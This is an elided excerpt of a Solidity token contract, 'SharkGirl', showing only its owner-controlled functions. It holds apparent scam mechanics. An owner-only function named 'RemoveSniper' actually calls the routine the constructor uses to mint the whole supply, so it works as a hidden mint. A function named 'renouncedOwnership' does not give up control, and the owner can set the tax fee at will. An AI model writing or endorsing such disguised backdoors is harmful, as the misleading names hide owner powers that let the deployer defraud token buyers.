...
contract Ownable is Context {
    ...
    function setTaxFeePercent(uint8 _owned) public virtual onlyOwner {
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RemoveSniper(uint256 amount) public onlyOwner {

    _RemoveSniper(msg.sender, amount);

    }

    

    function renouncedOwnership(uint256 BurnFee) external onlyOwner(){
    ...
    function _RemoveSniper(address account, uint256 amount) internal virtual {
...
contract SharkGirl is ERC20 {
    ...
    constructor() public ERC20("SharkGirl", "SharkGirl") {

        _RemoveSniper(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
